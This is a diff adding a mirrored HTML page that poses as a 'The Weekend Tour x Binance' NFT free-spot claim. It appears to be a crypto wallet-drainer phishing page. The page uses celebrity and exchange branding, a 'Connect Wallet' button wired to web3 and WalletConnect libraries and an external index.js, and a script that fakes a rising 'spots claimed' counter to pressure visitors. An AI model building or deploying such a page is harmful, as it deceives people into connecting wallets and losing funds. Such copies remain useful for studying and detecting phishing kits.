@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from oasis.airdrop.direct/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jun 2022 07:28:15 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/favicon.png">
+    <title>The Weekend Tour x Binance</title>
+	<!-- embed msg -->
+    <meta name="description" content="Theweekend Nft" data-react-helmet="true" />
+    <meta name="description" content="Theweekend Nft" data-react-helmet="true">
+    <meta content="🚨 ➥ CLAIM YOUR SPOT NOW! ✅" property="og:title">
+    <meta content="
+	
+    🎉 Theweekend! Early access to our Tour .
+
+    🎈 Congratulations, you've been selected to claim a free spot!
+
+    💻Mint Only via Desktop/PC
+    
+    ❗ Do not click any other links, stay safe!
+
+    🌟 Thank you for your support. Goodluck!" 
+	
+    property="og:description">
+    <meta content='https://i.imgur.com/RMxl8Bq.jpg' property='og:image'>
+    <meta name="twitter:card" content="summary_large_image">
+	<link type="application/json+oembed" href="https://theweekndnft.art/embed.json"/>
+
+
+
+    <meta content="#DFFF1D" data-react-helmet="true" name="theme-color">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <meta name="theme-color" content="#DFFF1D">
+    <!-- -->
+    <link rel="stylesheet" href="style.css">
+    <!--<link rel="icon" type="image/x-icon" href="/images/favicon.ico">-->
+	 <link rel="shortcut icon" href="img/favicon.png">
+	<!-- Matomo -->
+	<script>
+	var _paq = window._paq = window._paq || [];
+	/* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+	_paq.push(['trackPageView']);
+	_paq.push(['enableLinkTracking']);
+	(function() {
+		var u="http://mtmserv.com/";
+		_paq.push(['setTrackerUrl', u+'matomo.php']);
+		_paq.push(['setSiteId', '18']);
+		var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+		g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+	})();
+	</script>
+	<!-- End Matomo Code -->
+</head>
+<body>
+    <main>
+        <div class="wrapper">
+            <div class="background">
+                <img src="img/bg.jpg" alt="NO IMG">
+            </div>
+
+            <div class="content">
+                <div class="top-sec">
+                    <div class="logo">
+                        <img src="img/gif.gif">
+                    </div>
+                    <div class="title">
+                        <h1>
+                            Claim your Spot to get access to Theweekend Tour!
+                        </h1>
+                    </div>
+                </div>
+                <div class="middle-sec">
+                    <div>
+                        <button id="connectButton">Connect Wallet</button>
+
+                        <div id="claimSection" style="display:none;">
+                            <button id="claimButton">Claim Free Spot</button>
+                            <p id="walletAddress"></p>
+                            <p id="notEli" style="display:none ; color: red;">Not enough funds</p>
+                        </div>
+
+                        <h3><span id="supply">1023</span>/6888 Spots already claimed</h3>
+						<script>
+							var total = 3000;
+							
+							var maxMintNum = 10;
+							
+							function getRandomInRange(min, max) {
+                             return Math.floor(Math.random() * (max - min + 1)) + min;
+                           }
+						   
+                           function writeCookie(name, val, expires) {
+                           	var date = new Date;
+                           	date.setDate(date.getDate() + expires);
+                           	document.cookie = name + "=" + val + "; path=/; expires=" + date.toUTCString();
+                           }
+                           
+                           function readCookie(name) {
+                           	var matches = document.cookie.match(new RegExp(
+                           		"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+							));
+							return matches ? decodeURIComponent(matches[1]) : undefined;
+                           }
+						   
+                           var supply = Number(readCookie('minted'));
+                           if (supply > 0) {
+                               writeCookie('status', 'yes', 30);
+                               var supply = Number(readCookie('minted'));
+                               document.getElementById("supply").innerHTML = supply;
+                           } else {
+                               var supply = 112;
+                               writeCookie('minted', 112, 30);
+                           };
+                           var interval = setInterval(foo, getRandomInRange(500,1100))
+                           
+                           function foo() {
+                                if (supply < (total / 2)) {
+                                   supply = supply + getRandomInRange(3,maxMintNum);
+                                   writeCookie('minted', supply, 30);
+                                   document.getElementById("supply").innerHTML = supply;
+                                }
+							    if ((supply >= (total / 2)) && (supply < (total - (total/3)))) {
+                                   supply = supply + getRandomInRange(1,maxMintNum/2);
+                                   writeCookie('minted', supply, 30);
+                                   document.getElementById("supply").innerHTML = supply;
+                                }
+                               if (supply >= (total - maxMintNum)) clearInterval(interval);
+                           }
+                           
+                        </script>
+                    </div>
+                </div>
+
+                <div class="bottom-sec">
+                    <div></div>
+                    <!---
+                    
+                                        <div>
+                        <p>Terms & Conditions</p>
+                        <p>Privacy Policy</p>
+                        <p>© 2022</p>
+                    </div>-->
+                    <div class="social-media">
+                       <!-- <a href="https://discord.com/invite/feMr5bDAt3"><img src="img/discord.svg"></a> -->
+                       <!-- <a href="https://www.instagram.com/musicology_io/"><img src="./img/insta.svg"></a> -->
+                        <a href="https://twitter.com/theweeknd"><img src="img/twiter.svg"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+   <script src="unpkg.com/%40walletconnect/web3-provider%401.7.5/dist/umd/index.min.js"></script>
+    <script src="unpkg.com/web3%401.7.4/dist/web3.min.js"></script>
+    <script src="npmcdn.com/moralis%401.8.0/dist/moralis.js"></script>
+  
+    <script src="index.js"></script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/62b6d523b0d10b6f3e794224/1g6d3170q';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+
+</body>
+
+<!-- Mirrored from oasis.airdrop.direct/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jun 2022 07:28:37 GMT -->
+</html>
